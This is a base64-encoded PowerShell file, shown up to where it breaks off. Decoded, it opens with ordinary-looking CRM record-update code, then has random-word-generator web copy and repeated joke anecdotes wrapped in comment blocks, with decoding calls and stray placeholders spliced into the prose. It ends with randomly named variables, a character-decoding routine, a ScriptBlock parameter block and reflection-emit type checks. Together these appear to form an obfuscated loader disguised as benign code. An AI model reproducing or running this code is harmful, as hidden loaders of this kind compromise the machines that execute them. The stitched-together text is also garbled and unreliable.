IpIC1uZSAkbnVsbCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkdHlwZSA9ICRDcm1SZWNvcmQuKCRjcm1GaWVsZEtleSArICJfUHJvcGVydHkiKS5WYWx1ZS5HZXRUeXBlKCkuTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR0eXBlID0gJGNybUZpZWxkVmFsdWUuR2V0VHlwZSgpLk5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHN3aXRjaCgkdHlwZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAiQm9vbGVhbiIgewogICAgICAgICAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OkNybUJvb2xlYW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGNybUZpZWxkVmFsdWUgLWlzIFtCb29sZWFuXSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gJGNybUZpZWxkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9IFtJbnQzMl06OlBhcnNlKCRjcm1GaWVsZFZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJEYXRlVGltZSIgewogICAgICAgICAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OkNybURhdGVUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbRGF0ZVRpbWVdKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSAkY3JtRmllbGRWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gW0RhdGVUaW1lXTo6UGFyc2UoJGNybUZpZWxkVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIkRlY2ltYWwiIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld2ZpZWxkLlR5cGUgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpDcm1EZWNpbWFsCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbRGVjaW1hbF0pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9ICRjcm1GaWVsZFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSBbRGVjaW1hbF06OlBhcnNlKCRjcm1GaWVsZFZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJTaW5nbGUiIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld2ZpZWxkLlR5cGUgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpDcm1GbG9hdAogICAgICAgICAgICAgICAgICAgICAgICBpZigkY3JtRmllbGRWYWx1ZSAtaXMgW1NpbmdsZV0pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9ICRjcm1GaWVsZFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSBbU2luZ2xlXTo6UGFyc2UoJGNybUZpZWxkVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIk1vbmV5IiB7CiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZC5UeXBlID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuTW9uZXldKQogICAgICAgICAgICAgICAgICAgICAgICB7ICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gJGNybUZpZWxkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSAnTWljcm9zb2Z0LlhybS5TZGsuTW9uZXknCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUuVmFsdWUgPSAkY3JtRmllbGRWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJJbnQzMiIgewogICAgICAgICAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OkNybU51bWJlcgogICAgICAgICAgICAgICAgICAgICAgICBpZigkY3JtRmllbGRWYWx1ZSAtaXMgW0ludDMyXSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gJGNybUZpZWxkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9IFtJbnQzMl06OlBhcnNlKCRjcm1GaWVsZFZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJFbnRpdHlSZWZlcmVuY2UiIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld2ZpZWxkLlR5cGUgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpSYXcKICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gJGNybUZpZWxkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIk9wdGlvblNldFZhbHVlIiB7CiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZC5UeXBlID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuT3B0aW9uU2V0VmFsdWVdKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSAkY3JtRmllbGRWYWx1ZSAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgJ01pY3Jvc29mdC5Ycm0uU2RrLk9wdGlvblNldFZhbHVlJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlLlZhbHVlID0gW0ludDMyXTo6UGFyc2UoJGNybUZpZWxkVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIlN0cmluZyIgewogICAgICAgICAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlN0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSAkY3JtRmllbGRWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkZWZhdWx0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld2ZpZWxkLlR5cGUgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpSYXcKICAgICAgICAgICAgICAgICAgICAgICAgJHZhbHVlID0gJGNybUZpZWxkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG5ld2ZpZWxkLlZhbHVlID0gJHZhbHVlCiAgICAgICAgICAgICRuZXdmaWVsZHMuQWRkKCRjcm1GaWVsZEtleSwgJG5ld2ZpZWxkKQogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBmb3JlYWNoKCRmaWVsZCBpbiAkRmllbGRzLkdldEVudW1lcmF0b3IoKSkKICAgICAgICB7ICAKICAgICAgICAgICAgJG5ld2ZpZWxkID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgJ01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRGF0YVR5cGVXcmFwcGVyJwogICAgICAgICAgICBpZigkZmllbGQudmFsdWUgLWVxICRudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlJhdwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJG5ld2ZpZWxkLlR5cGUgPSBNYXBGaWVsZFR5cGVCeUZpZWxkVmFsdWUgLVZhbHVlICRmaWVsZC5WYWx1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXdmaWVsZC5WYWx1ZSA9ICRmaWVsZC5WYWx1ZQogICAgICAgICAgICAkbmV3ZmllbGRzLkFkZCgkZmllbGQuS2V5LCAkbmV3ZmllbGQpCiAgICAgICAgfQogICAgfQogICAgdHJ5CiAgICB7CiAgICAgICAgIyBpZiBubyBmaWVsZCBoYXMgbmV3IHZhbHVlLCB0aGVuIGRvIG5vdGhpbmcuCiAgICAgICAgaWYoJG5ld2ZpZWxkcy5Db3VudCAtZXEgMCkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAgICAgICAkcmVzdWx0ID0gJGNvbm4uVXBkYXRlRW50aXR5KCRlbnRpdHlMb2dpY2FsTmFtZSwgJHByaW1hcnlLZXlGaWVsZCwgJElkLCAkbmV3ZmllbGRzLCAkbnVsbCwgJGZhbHNlLCBbR3VpZF06OkVtcHR5KQogICAgICAgIGlmKCEkcmVzdWx0KQogICAgICAgIHsKCQkJdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgICAgICB9CiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgICNUT0RPOiBUaHJvdyBFeGNlcHRpb25zIGJhY2sgdG8gdXNlcgoJCXRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KCiRhU2c5RDkycjdWeE1ndE55UjZQR3lQOWh0SjRZQ0M2SmRYWnRQTUZQcTNKWDRVczNObjRFMlV5bkE3VURBTGJ0aGJuZzZWY0J2dG5NRVZwRiA9IEAiCiAgICAgICAgZnVuY3Rpb24gV3VKamVZQ2lHQ2lLV3JnbHsKICAgICAgICBwYXJhbSgkb1poZ1VsdkIwTW1tTHRFWFFyNjJFKQogICAgICAgICRQTEltOVNSeEpORGplU00gPSBbaW50XSRvWmhHVWx2YjBNbW1sVEV4UVI2MkVbMF0KICAgICAgICAkbnp3cWhtdCA9ICcnCiAgICAgICAgZm9yKCRyZHJZazlmV0ZxQ184ck5wdyA9ICgwICsgMSk7ICRyRFJ5azlmd0ZxQ184Um5wdyAtbHQgJG96aEd1bFZiME1tbWxUZVhRcjYyRS5sZW5ndGg7ICRSZHJZazlGd0ZRY184cm5wdyArPSAoMyAtIDEpKXsKICAgICAgICAgICAgJG5ad3FobVQgKz0gW2NoYXJdKCg3ICsgOSkgKiAoW2ludF0kb1poZ3VsVkIwTU1NbFRFeFFyNjJFWyRyZFJ5SzlGV2ZxY184Um5wd10gLSAkcExpbTlTcnhKTkRqRVNtKSArIChbaW50XSRvemhnVWx2QjBNbW1sVEVYcXI2MkVbJHJkUllrOUZXZlFjXzhSTnBXICsgMV0gLSAkUGxpbTlTcnhqTmRqZXNtKSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRuWndRaE10CiAgICAgICAgfQoiQAokY2o0Qmt2UFFKU3UgPSBAIgogICAgICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gKCd7MX17MH0nLWYnUGF0aCcsJ0ZpbGUnKSldIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVFJVZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICh3dWpKRVlDSUdDSWt3cmdsKCdTY3JpcHRCbG9jaycpKSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU2NyaXB0QmxvY2tdCiAgICAgICAgJG85ZGYwU3JQVDgzRjZCaG81SSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAoV3VKSkVZQ0lHY0lLV3JnbCgnRmlsZVBhdGgnKSkpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkaFdMNEJVQ2tZOSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkY09tUFcwbmJXTTc4ZXdJWTRFSCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkWWpMWHlQOU43LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRjUTJkUUdhYUNFU0k1LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRIQllEc25LZVBYeTgsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEM5SzA0TUIsCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkWE9RZE1DRE1QLAoiQApmdW5jdGlvbiBlewogICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeygkXyAtaXMgW1JlZmxlY3Rpb24uRW1pdC5Nb2R1bGVCdWlsZGVyXSkgLW9yICgkXyAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKX0pXQogICAgICAgICRNb2R1bGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFt